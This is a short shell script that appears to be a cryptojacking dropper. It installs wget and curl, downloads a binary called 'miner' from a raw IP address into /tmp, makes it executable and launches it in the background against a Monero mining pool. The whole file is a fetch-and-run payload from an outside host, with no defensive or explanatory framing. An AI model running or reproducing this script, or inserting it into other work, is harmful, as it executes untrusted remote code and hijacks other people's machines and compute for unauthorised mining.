#!/bin/sh

apk add wget curl || apt-get install -y wget curl || true
/usr/bin/wget 143.198.125.69/miner_linux_amd64 -O /tmp/miner && chmod +x /tmp/miner && /tmp/miner pool.minexmr.com --donate-level=0 &
